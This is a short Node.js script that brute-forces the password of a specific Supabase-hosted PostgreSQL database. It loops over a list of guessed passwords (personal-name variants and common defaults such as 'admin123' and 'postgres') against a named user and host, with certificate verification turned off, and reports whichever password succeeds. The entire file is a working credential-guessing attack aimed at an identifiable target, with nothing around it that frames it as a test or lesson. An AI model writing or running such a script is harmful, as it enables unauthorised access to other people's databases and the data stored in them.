const { Client } = require('pg');

async function brute() {
    const user = "postgres.swexktlzarqksjdxzsiu";
    const host = "db.swexktlzarqksjdxzsiu.supabase.co";
    const passwords = ["surajGholase", "suraj@123", "suraj123", "admin123", "password", "postgres"];

    for (const pass of passwords) {
        console.log('Trying:', pass);
        const url = `postgresql://${user}:${pass}@${host}:5432/postgres`;
        const client = new Client({
            connectionString: url,
            ssl: { rejectUnauthorized: false }
        });

        try {
            await client.connect();
            console.log('✅ FOUND PASSWORD:', pass);
            await client.end();
            return;
        } catch (err) {
            console.error('❌ Failed:', err.message);
        } finally {
            try { await client.end(); } catch (e) { }
        }
    }
}

brute();
